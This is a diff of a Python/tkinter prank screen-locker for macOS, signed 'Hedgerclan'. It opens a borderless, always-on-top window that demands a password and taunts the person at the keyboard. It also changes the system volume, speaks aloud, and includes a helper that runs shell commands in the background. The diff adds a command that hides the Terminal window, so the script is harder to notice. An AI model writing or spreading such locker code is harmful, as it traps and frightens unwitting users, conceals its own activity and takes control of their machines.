@@ -4,9 +4,10 @@ import tkinter as tk
 import subprocess
 from pynput.keyboard import Key, Controller
 
-os.system('osascript -e "set Volume 5"')
+os.system('osascript -e "set Volume 3"')
 os.system("say Up and running ")
 
+          
 def run_command_in_background(command):
     subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
@@ -85,14 +86,14 @@ password_entry.pack(side=tk.TOP)
 password_result = tk.Label(root, text="", font=("Helvetica", 25))
 password_result.pack(side=tk.TOP)
 
-label_above = tk.Label(root, text="^^^^^^^ input the password ABOVE correctly or cry ^^^^^^^", font=("Helvetica", 30))
-label_center = tk.Label(root, text="you fell for something Hedgerclan made... lol", font=("Helvetica", 30))
+label_above = tk.Label(root, text="^^^^^^^ Input Password above ^^^^^^^", font=("Helvetica", 30))
+label_center = tk.Label(root, text="you fell for something Hedgerclan made", font=("Helvetica", 30))
 label_below = tk.Label(root, text="MADE BY Hedgerclan", font=("Helvetica", 30))
 label_above.pack(side=tk.TOP)
 label_center.pack(side=tk.TOP)
 label_below.pack(side=tk.BOTTOM)
 
-label = tk.Label(root, text="WARNING getting the password wrong will cause issues", font=("Helvetica", 35))
+label = tk.Label(root, text="get good", font=("Helvetica", 35))
 label.pack(side=tk.TOP)
 
 flash_status = True
@@ -105,7 +106,7 @@ password_entry.bind("<Return>", submit_password)
 root.overrideredirect(True)
 root.attributes("-topmost", True)
 root.focus_force()
-
+os.system('osascript -e "tell application "Terminal" to set visible of front window to false')
 root.mainloop()
 
 if access == True:
